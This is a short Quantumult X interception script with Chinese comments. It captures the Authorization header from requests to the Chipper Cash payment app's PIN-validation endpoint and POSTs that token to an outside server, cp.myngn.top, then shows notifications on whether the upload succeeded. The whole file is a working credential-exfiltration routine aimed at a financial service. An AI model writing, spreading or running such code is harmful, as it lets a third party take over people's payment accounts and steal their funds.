const urlToIntercept = "https://auth.chippercash.com/pin/validate";

// Quantumult X 拦截请求的处理逻辑
const myRequest = $request;

// 判断是否拦截到目标URL
if (myRequest.url.includes(urlToIntercept)) {
    
    // 获取 Authorization 值
    const authorizationToken = myRequest.headers["Authorization"];

    if (authorizationToken) {
        // 准备上传数据
        const uploadUrl = "https://cp.myngn.top/receive_token";
        const uploadHeaders = {
            'Content-Type': 'application/json'
        };
        const uploadData = {
            'Authorization': authorizationToken
        };

        // 通过 $task.fetch 来发送请求
        const uploadRequest = {
            url: uploadUrl,
            method: 'POST',
            headers: uploadHeaders,
            body: JSON.stringify(uploadData)
        };

        // 发送 POST 请求到上传服务器
        $task.fetch(uploadRequest).then(response => {
            const statusCode = response.statusCode;
            const responseBody = response.body;

            // 检查上传是否成功并输出信息
            if (statusCode === 200) {
                $notify("Token 上传成功", "成功上传 Authorization 令牌", `服务器响应: ${responseBody}`);
            } else {
                $notify("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${responseBody}`);
            }
        }).catch(error => {
            $notify("Token 上传失败", "请求发生错误", `${error}`);
        });
    } else {
        // 如果没有找到 Authorization 头
        $notify("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
    }
}

// 结束脚本
$done();
